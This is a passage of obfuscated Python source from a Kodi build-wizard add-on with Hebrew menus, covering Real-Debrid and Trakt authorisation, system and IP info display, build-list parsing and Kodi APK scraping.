	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2432
def morsetup ():#line:2434
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2435
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2436
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2437
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2438
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2439
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2443
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2444
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2447
	addFile ('התקנת לקוח טלוויזיה חיה','simpleiptv',icon =ICONMAINT ,themeit =THEME1 )#line:2448
	addFile ('הגדרת ערוצים עידן פלוס בטלוויזיה חיה','simpleidanplus',icon =ICONMAINT ,themeit =THEME1 )#line:2449
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2450
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2460
	setView ('files','viewType')#line:2461
def morsetup2 ():#line:2462
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2463
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2464
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2465
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2466
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2467
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2468
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2469
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2470
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2471
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2472
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2473
def fastupdate ():#line:2474
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2475
def forcefastupdate ():#line:2477
			OO0OOOO0OO0OOO00O ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2478
			wiz .ForceFastUpDate (ADDONTITLE ,OO0OOOO0OO0OOO00O )#line:2479
def rdsetup ():#line:2483
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2484
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2485
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2487
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2488
def traktsetup ():#line:2491
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2492
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2493
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2494
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2495
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2496
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2497
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2498
	setView ('files','viewType')#line:2499
def setautorealdebrid ():#line:2500
    from resources .libs import real_debrid #line:2501
    O0OOO0000O0OOO0OO =real_debrid .RealDebridFirst ()#line:2502
    O0OOO0000O0OOO0OO .auth ()#line:2503
def setrealdebrid ():#line:2505
    OO0O0O0000O0OO0OO =(ADDON .getSetting ("auto_rd"))#line:2506
    if OO0O0O0000O0OO0OO =='false':#line:2507
       ADDON .openSettings ()#line:2508
    else :#line:2509
        from resources .libs import real_debrid #line:2510
        OO000OOO0O000OOOO =real_debrid .RealDebrid ()#line:2511
        OO000OOO0O000OOOO .auth ()#line:2512
        rdon ()#line:2515
def resolveurlsetup ():#line:2517
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2518
def urlresolversetup ():#line:2519
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2520
def placentasetup ():#line:2522
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2523
def reptiliasetup ():#line:2524
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2525
def flixnetsetup ():#line:2526
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2527
def yodasetup ():#line:2528
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2529
def numberssetup ():#line:2530
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2531
def uranussetup ():#line:2532
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2533
def genesissetup ():#line:2534
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2535
def net_tools (view =None ):#line:2537
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2538
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2539
	setView ('files','viewType')#line:2541
def speedMenu ():#line:2542
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2543
def viewIP ():#line:2544
	OO0O0000000O0OO00 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2558
	OOOOOOO0OOO0O0O0O =[];O0O00O000000O0O0O =0 #line:2559
	for OO0OO00O00OO0OO00 in OO0O0000000O0OO00 :#line:2560
		O0O0OO00O0OO0OO0O =wiz .getInfo (OO0OO00O00OO0OO00 )#line:2561
		O0O000000O000O0O0 =0 #line:2562
		while O0O0OO00O0OO0OO0O =="Busy"and O0O000000O000O0O0 <10 :#line:2563
			O0O0OO00O0OO0OO0O =wiz .getInfo (OO0OO00O00OO0OO00 );O0O000000O000O0O0 +=1 ;wiz .log ("%s sleep %s"%(OO0OO00O00OO0OO00 ,str (O0O000000O000O0O0 )));xbmc .sleep (1000 )#line:2564
		OOOOOOO0OOO0O0O0O .append (O0O0OO00O0OO0OO0O )#line:2565
		O0O00O000000O0O0O +=1 #line:2566
	OO000O0000OOO00OO ,OOOOO0OO00000000O ,OO000000O000OOOO0 =getIP ()#line:2567
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOOO0OOO0O0O0O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2568
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O0000OOO00OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2569
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO0OO00000000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2570
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000000O000OOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2571
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOOO0OOO0O0O0O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2572
	setView ('files','viewType')#line:2573
def buildMenu ():#line:2575
	if USERNAME =='':#line:2576
		ADDON .openSettings ()#line:2577
		sys .exit ()#line:2578
	if PASSWORD =='':#line:2579
		ADDON .openSettings ()#line:2580
	OOOOOOO000O00O000 =u_list (SPEEDFILE )#line:2581
	(OOOOOOO000O00O000 )#line:2582
	O0OO0OOO00O000O0O =(wiz .workingURL (OOOOOOO000O00O000 ))#line:2583
	(O0OO0OOO00O000O0O )#line:2584
	O0OO0OOO00O000O0O =wiz .workingURL (SPEEDFILE )#line:2585
	if not O0OO0OOO00O000O0O ==True :#line:2586
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2587
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2588
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2589
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2590
		addFile ('%s'%O0OO0OOO00O000O0O ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2591
	else :#line:2592
		O0O0O0000OOOO0OOO ,O00O00OOOOO0OOO0O ,OOO0O000000OOO00O ,O0O000O00O0O0OO0O ,OOOO0O0000O0O0O0O ,O0000OOOO0OO00O0O ,OOOOOOOO00O0OO00O =wiz .buildCount ()#line:2593
		OO0O00OO0OO0O0000 =False ;O00O0000O0O00OO00 =[]#line:2594
		if THIRDPARTY =='true':#line:2595
			if not THIRD1NAME ==''and not THIRD1URL =='':OO0O00OO0OO0O0000 =True ;O00O0000O0O00OO00 .append ('1')#line:2596
			if not THIRD2NAME ==''and not THIRD2URL =='':OO0O00OO0OO0O0000 =True ;O00O0000O0O00OO00 .append ('2')#line:2597
			if not THIRD3NAME ==''and not THIRD3URL =='':OO0O00OO0OO0O0000 =True ;O00O0000O0O00OO00 .append ('3')#line:2598
		OO00OO0OO00OOOO0O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2599
		O0OO0OO0OO0OOO000 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO00OO0OO00OOOO0O )#line:2600
		if O0O0O0000OOOO0OOO ==1 and OO0O00OO0OO0O0000 ==False :#line:2601
			for OO0O00O0OO00O000O ,OOOO0O0OO00000O00 ,OO0O0O0O00OOO000O ,OO0OO0OOO00OO000O ,OO00O00O0000OOO0O ,O0000O00000000O0O ,O00OO00O00OO000OO ,O00O00O0000OOOOOO ,O00OOOO0O0O0OO00O ,OOO00O0O0O000O00O in O0OO0OO0OO0OOO000 :#line:2602
				if not SHOWADULT =='true'and O00OOOO0O0O0OO00O .lower ()=='yes':continue #line:2603
				if not DEVELOPER =='true'and wiz .strTest (OO0O00O0OO00O000O ):continue #line:2604
				viewBuild (O0OO0OO0OO0OOO000 [0 ][0 ])#line:2605
				return #line:2606
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2609
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2610
		if OO0O00OO0OO0O0000 ==True :#line:2611
			for OOO00OO0OOOOOOO00 in O00O0000O0O00OO00 :#line:2612
				OO0O00O0OO00O000O =eval ('THIRD%sNAME'%OOO00OO0OOOOOOO00 )#line:2613
		if len (O0OO0OO0OO0OOO000 )>=1 :#line:2615
			if SEPERATE =='true':#line:2616
				for OO0O00O0OO00O000O ,OOOO0O0OO00000O00 ,OO0O0O0O00OOO000O ,OO0OO0OOO00OO000O ,OO00O00O0000OOO0O ,O0000O00000000O0O ,O00OO00O00OO000OO ,O00O00O0000OOOOOO ,O00OOOO0O0O0OO00O ,OOO00O0O0O000O00O in O0OO0OO0OO0OOO000 :#line:2617
					if not SHOWADULT =='true'and O00OOOO0O0O0OO00O .lower ()=='yes':continue #line:2618
					if not DEVELOPER =='true'and wiz .strTest (OO0O00O0OO00O000O ):continue #line:2619
					OOOOO0OO0OOOO0O0O =createMenu ('install','',OO0O00O0OO00O000O )#line:2620
					addDir ('[%s] %s (v%s)'%(float (OO00O00O0000OOO0O ),OO0O00O0OO00O000O ,OOOO0O0OO00000O00 ),'viewbuild',OO0O00O0OO00O000O ,description =OOO00O0O0O000O00O ,fanart =O00O00O0000OOOOOO ,icon =O00OO00O00OO000OO ,menu =OOOOO0OO0OOOO0O0O ,themeit =THEME2 )#line:2621
			else :#line:2622
				if O0O000O00O0O0OO0O >0 :#line:2623
					OO0OOO0OO000OO0O0 ='+'if SHOW17 =='false'else '-'#line:2624
					if SHOW17 =='true':#line:2626
						for OO0O00O0OO00O000O ,OOOO0O0OO00000O00 ,OO0O0O0O00OOO000O ,OO0OO0OOO00OO000O ,OO00O00O0000OOO0O ,O0000O00000000O0O ,O00OO00O00OO000OO ,O00O00O0000OOOOOO ,O00OOOO0O0O0OO00O ,OOO00O0O0O000O00O in O0OO0OO0OO0OOO000 :#line:2628
							if not SHOWADULT =='true'and O00OOOO0O0O0OO00O .lower ()=='yes':continue #line:2629
							if not DEVELOPER =='true'and wiz .strTest (OO0O00O0OO00O000O ):continue #line:2630
							O0OO000O00OO000O0 =int (float (OO00O00O0000OOO0O ))#line:2631
							if O0OO000O00OO000O0 ==17 :#line:2632
								OOOOO0OO0OOOO0O0O =createMenu ('install','',OO0O00O0OO00O000O )#line:2633
								addDir ('[%s] %s (v%s)'%(float (OO00O00O0000OOO0O ),OO0O00O0OO00O000O ,OOOO0O0OO00000O00 ),'viewbuild',OO0O00O0OO00O000O ,description =OOO00O0O0O000O00O ,fanart =O00O00O0000OOOOOO ,icon =O00OO00O00OO000OO ,menu =OOOOO0OO0OOOO0O0O ,themeit =THEME2 )#line:2634
				if OOOO0O0000O0O0O0O >0 :#line:2635
					OO0OOO0OO000OO0O0 ='+'if SHOW18 =='false'else '-'#line:2636
					if SHOW18 =='true':#line:2638
						for OO0O00O0OO00O000O ,OOOO0O0OO00000O00 ,OO0O0O0O00OOO000O ,OO0OO0OOO00OO000O ,OO00O00O0000OOO0O ,O0000O00000000O0O ,O00OO00O00OO000OO ,O00O00O0000OOOOOO ,O00OOOO0O0O0OO00O ,OOO00O0O0O000O00O in O0OO0OO0OO0OOO000 :#line:2640
							if not SHOWADULT =='true'and O00OOOO0O0O0OO00O .lower ()=='yes':continue #line:2641
							if not DEVELOPER =='true'and wiz .strTest (OO0O00O0OO00O000O ):continue #line:2642
							O0OO000O00OO000O0 =int (float (OO00O00O0000OOO0O ))#line:2643
							if O0OO000O00OO000O0 ==18 :#line:2644
								OOOOO0OO0OOOO0O0O =createMenu ('install','',OO0O00O0OO00O000O )#line:2645
								addDir ('[%s] %s (v%s)'%(float (OO00O00O0000OOO0O ),OO0O00O0OO00O000O ,OOOO0O0OO00000O00 ),'viewbuild',OO0O00O0OO00O000O ,description =OOO00O0O0O000O00O ,fanart =O00O00O0000OOOOOO ,icon =O00OO00O00OO000OO ,menu =OOOOO0OO0OOOO0O0O ,themeit =THEME2 )#line:2646
				if OOO0O000000OOO00O >0 :#line:2647
					OO0OOO0OO000OO0O0 ='+'if SHOW16 =='false'else '-'#line:2648
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OO0OOO0OO000OO0O0 ,OOO0O000000OOO00O ),'togglesetting','show16',themeit =THEME3 )#line:2649
					if SHOW16 =='true':#line:2650
						for OO0O00O0OO00O000O ,OOOO0O0OO00000O00 ,OO0O0O0O00OOO000O ,OO0OO0OOO00OO000O ,OO00O00O0000OOO0O ,O0000O00000000O0O ,O00OO00O00OO000OO ,O00O00O0000OOOOOO ,O00OOOO0O0O0OO00O ,OOO00O0O0O000O00O in O0OO0OO0OO0OOO000 :#line:2651
							if not SHOWADULT =='true'and O00OOOO0O0O0OO00O .lower ()=='yes':continue #line:2652
							if not DEVELOPER =='true'and wiz .strTest (OO0O00O0OO00O000O ):continue #line:2653
							O0OO000O00OO000O0 =int (float (OO00O00O0000OOO0O ))#line:2654
							if O0OO000O00OO000O0 ==16 :#line:2655
								OOOOO0OO0OOOO0O0O =createMenu ('install','',OO0O00O0OO00O000O )#line:2656
								addDir ('[%s] %s (v%s)'%(float (OO00O00O0000OOO0O ),OO0O00O0OO00O000O ,OOOO0O0OO00000O00 ),'viewbuild',OO0O00O0OO00O000O ,description =OOO00O0O0O000O00O ,fanart =O00O00O0000OOOOOO ,icon =O00OO00O00OO000OO ,menu =OOOOO0OO0OOOO0O0O ,themeit =THEME2 )#line:2657
				if O00O00OOOOO0OOO0O >0 :#line:2658
					OO0OOO0OO000OO0O0 ='+'if SHOW15 =='false'else '-'#line:2659
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OO0OOO0OO000OO0O0 ,O00O00OOOOO0OOO0O ),'togglesetting','show15',themeit =THEME3 )#line:2660
					if SHOW15 =='true':#line:2661
						for OO0O00O0OO00O000O ,OOOO0O0OO00000O00 ,OO0O0O0O00OOO000O ,OO0OO0OOO00OO000O ,OO00O00O0000OOO0O ,O0000O00000000O0O ,O00OO00O00OO000OO ,O00O00O0000OOOOOO ,O00OOOO0O0O0OO00O ,OOO00O0O0O000O00O in O0OO0OO0OO0OOO000 :#line:2662
							if not SHOWADULT =='true'and O00OOOO0O0O0OO00O .lower ()=='yes':continue #line:2663
							if not DEVELOPER =='true'and wiz .strTest (OO0O00O0OO00O000O ):continue #line:2664
							O0OO000O00OO000O0 =int (float (OO00O00O0000OOO0O ))#line:2665
							if O0OO000O00OO000O0 <=15 :#line:2666
								OOOOO0OO0OOOO0O0O =createMenu ('install','',OO0O00O0OO00O000O )#line:2667
								addDir ('[%s] %s (v%s)'%(float (OO00O00O0000OOO0O ),OO0O00O0OO00O000O ,OOOO0O0OO00000O00 ),'viewbuild',OO0O00O0OO00O000O ,description =OOO00O0O0O000O00O ,fanart =O00O00O0000OOOOOO ,icon =O00OO00O00OO000OO ,menu =OOOOO0OO0OOOO0O0O ,themeit =THEME2 )#line:2668
		elif OOOOOOOO00O0OO00O >0 :#line:2669
			if O0000OOOO0OO00O0O >0 :#line:2670
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2671
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2672
			else :#line:2673
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2674
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2675
	setView ('files','viewType')#line:2676
def viewBuild (O0OOOO00O00O00OO0 ):#line:2678
	OOO0OOO0O0O0OOOOO =wiz .workingURL (SPEEDFILE )#line:2679
	if not OOO0OOO0O0O0OOOOO ==True :#line:2680
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2681
		addFile ('%s'%OOO0OOO0O0O0OOOOO ,'',themeit =THEME3 )#line:2682
		return #line:2683
	if wiz .checkBuild (O0OOOO00O00O00OO0 ,'version')==False :#line:2684
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2685
		addFile ('%s was not found in the builds list.'%O0OOOO00O00O00OO0 ,'',themeit =THEME3 )#line:2686
		return #line:2687
	OO0OOO0O0OO0OOO0O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2688
	O00O0OOOOO00000O0 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0OOOO00O00O00OO0 ).findall (OO0OOO0O0OO0OOO0O )#line:2689
	for O00O0O0O00OO0000O ,OO0000OO0O0OO0000 ,O0O00000OO0O0OO0O ,OOO0OO0OOO0OOOOO0 ,O00OOO0OO000OOO00 ,OOOO00OOO0OOO00OO ,OOO000O000OOO0OOO ,OOOO0O00OO0OOO0OO ,OOO000OO000O0O0O0 ,OO00O0O0O0O0000O0 in O00O0OOOOO00000O0 :#line:2690
		OOOO00OOO0OOO00OO =OOOO00OOO0OOO00OO if wiz .workingURL (OOOO00OOO0OOO00OO )else ICON #line:2691
		OOO000O000OOO0OOO =OOO000O000OOO0OOO if wiz .workingURL (OOO000O000OOO0OOO )else FANART #line:2692
		OOO0O0OOO00OOOOOO ='%s (v%s)'%(O0OOOO00O00O00OO0 ,O00O0O0O00OO0000O )#line:2693
		if BUILDNAME ==O0OOOO00O00O00OO0 and O00O0O0O00OO0000O >BUILDVERSION :#line:2694
			OOO0O0OOO00OOOOOO ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OOO0O0OOO00OOOOOO ,BUILDVERSION )#line:2695
		O0OOOO0O0O000O000 =int (float (KODIV ));O0O0O00O00OO0O000 =int (float (OOO0OO0OOO0OOOOO0 ))#line:2704
		if not O0OOOO0O0O000O000 ==O0O0O00O00OO0O000 :#line:2705
			if O0OOOO0O0O000O000 ==16 and O0O0O00O00OO0O000 <=15 :O00O0O00OO0000O00 =False #line:2706
			else :O00O0O00OO0000O00 =True #line:2707
		else :O00O0O00OO0000O00 =False #line:2708
		addFile ('התקנה','install',O0OOOO00O00O00OO0 ,'fresh',description =OO00O0O0O0O0000O0 ,fanart =OOO000O000OOO0OOO ,icon =OOOO00OOO0OOO00OO ,themeit =THEME1 )#line:2712
		if not O00OOO0OO000OOO00 =='http://':#line:2715
			if wiz .workingURL (O00OOO0OO000OOO00 )==True :#line:2716
				addFile (wiz .sep ('THEMES'),'',fanart =OOO000O000OOO0OOO ,icon =OOOO00OOO0OOO00OO ,themeit =THEME3 )#line:2717
				OO0OOO0O0OO0OOO0O =wiz .openURL (O00OOO0OO000OOO00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2718
				O00O0OOOOO00000O0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0OOO0O0OO0OOO0O )#line:2719
				for O00OO00OO0O0000OO ,O0O0OOO0O0OO000OO ,O0O00000O0O0OO00O ,O0000O0OO0OO00O00 ,O000000OO0OOO0OO0 ,OO00O0O0O0O0000O0 in O00O0OOOOO00000O0 :#line:2720
					if not SHOWADULT =='true'and O000000OO0OOO0OO0 .lower ()=='yes':continue #line:2721
					O0O00000O0O0OO00O =O0O00000O0O0OO00O if O0O00000O0O0OO00O =='http://'else OOOO00OOO0OOO00OO #line:2722
					O0000O0OO0OO00O00 =O0000O0OO0OO00O00 if O0000O0OO0OO00O00 =='http://'else OOO000O000OOO0OOO #line:2723
					addFile (O00OO00OO0O0000OO if not O00OO00OO0O0000OO ==BUILDTHEME else "[B]%s (Installed)[/B]"%O00OO00OO0O0000OO ,'theme',O0OOOO00O00O00OO0 ,O00OO00OO0O0000OO ,description =OO00O0O0O0O0000O0 ,fanart =O0000O0OO0OO00O00 ,icon =O0O00000O0O0OO00O ,themeit =THEME3 )#line:2724
	setView ('files','viewType')#line:2725
def viewThirdList (OO00OOOOO0OOO00O0 ):#line:2727
	O0O00OO0O0OO000OO =eval ('THIRD%sNAME'%OO00OOOOO0OOO00O0 )#line:2728
	OO0OO00OOOOOO0O0O =eval ('THIRD%sURL'%OO00OOOOO0OOO00O0 )#line:2729
	OO0O000000OOOOOO0 =wiz .workingURL (OO0OO00OOOOOO0O0O )#line:2730
	if not OO0O000000OOOOOO0 ==True :#line:2731
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2732
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2733
	else :#line:2734
		OOOOOOOOOOO00OOO0 ,O0OO00OO00O0OOO0O =wiz .thirdParty (OO0OO00OOOOOO0O0O )#line:2735
		addFile ("[B]%s[/B]"%O0O00OO0O0OO000OO ,'',themeit =THEME3 )#line:2736
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2737
		if OOOOOOOOOOO00OOO0 :#line:2738
			for O0O00OO0O0OO000OO ,OO000O0O00OO0000O ,OO0OO00OOOOOO0O0O ,OO00O0O0OOO0O0000 ,OOO00OO0O00000000 ,O0OO0OO000OO000O0 ,OOOO0OO0O0OO0O000 ,O000OOO0000O00O0O in O0OO00OO00O0OOO0O :#line:2739
				if not SHOWADULT =='true'and OOOO0OO0O0OO0O000 .lower ()=='yes':continue #line:2740
				addFile ("[%s] %s v%s"%(OO00O0O0OOO0O0000 ,O0O00OO0O0OO000OO ,OO000O0O00OO0000O ),'installthird',O0O00OO0O0OO000OO ,OO0OO00OOOOOO0O0O ,icon =OOO00OO0O00000000 ,fanart =O0OO0OO000OO000O0 ,description =O000OOO0000O00O0O ,themeit =THEME2 )#line:2741
		else :#line:2742
			for O0O00OO0O0OO000OO ,OO0OO00OOOOOO0O0O ,OOO00OO0O00000000 ,O0OO0OO000OO000O0 ,O000OOO0000O00O0O in O0OO00OO00O0OOO0O :#line:2743
				addFile (O0O00OO0O0OO000OO ,'installthird',O0O00OO0O0OO000OO ,OO0OO00OOOOOO0O0O ,icon =OOO00OO0O00000000 ,fanart =O0OO0OO000OO000O0 ,description =O000OOO0000O00O0O ,themeit =THEME2 )#line:2744
def editThirdParty (O000O00O00000O0O0 ):#line:2746
	OOO000OO0O0000OOO =eval ('THIRD%sNAME'%O000O00O00000O0O0 )#line:2747
	O000O00O0OOO000O0 =eval ('THIRD%sURL'%O000O00O00000O0O0 )#line:2748
	OOO0OOOO00000000O =wiz .getKeyboard (OOO000OO0O0000OOO ,'Enter the Name of the Wizard')#line:2749
	OO0O0OOOOOOO00O0O =wiz .getKeyboard (O000O00O0OOO000O0 ,'Enter the URL of the Wizard Text')#line:2750
	wiz .setS ('wizard%sname'%O000O00O00000O0O0 ,OOO0OOOO00000000O )#line:2752
	wiz .setS ('wizard%surl'%O000O00O00000O0O0 ,OO0O0OOOOOOO00O0O )#line:2753
def apkScraper (name =""):#line:2755
	if name =='kodi':#line:2756
		O0OOOOOOO0O0OO0O0 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2757
		OO00OO0O000O00O0O ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2758
		OOO00OO0O0000OO00 =wiz .openURL (O0OOOOOOO0O0OO0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2759
		O0OO0O00OO00OOOO0 =wiz .openURL (OO00OO0O000O00O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2760
		OOO00OOOO0O0O0000 =0 #line:2761
		O00OO0OOO00000O00 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOO00OO0O0000OO00 )#line:2762
		OO0OOO0O00OO0OO00 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O0OO0O00OO00OOOO0 )#line:2763
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2765
		O0OO00O00OO0O0000 =False #line:2766
		for O0000OOOOO0O0O000 ,name ,OO0000O00OOO00O00 ,OOOOOO0O000OOOOO0 in O00OO0OOO00000O00 :#line:2767
			if O0000OOOOO0O0O000 in ['../','old/']:continue #line:2768
			if not O0000OOOOO0O0O000 .endswith ('.apk'):continue #line:2769
			if not O0000OOOOO0O0O000 .find ('_')==-1 and O0OO00O00OO0O0000 ==True :continue #line:2770
			try :#line:2771
				O0O0000OOO0OO0O00 =name .split ('-')#line:2772
				if not O0000OOOOO0O0O000 .find ('_')==-1 :#line:2773
					O0OO00O00OO0O0000 =True #line:2774
					O0OOOOOOOOOOOOO00 ,OO0OOOO00O0O0000O =O0O0000OOO0OO0O00 [2 ].split ('_')#line:2775
				else :#line:2776
					O0OOOOOOOOOOOOO00 =O0O0000OOO0OO0O00 [2 ]#line:2777
					OO0OOOO00O0O0000O =''#line:2778
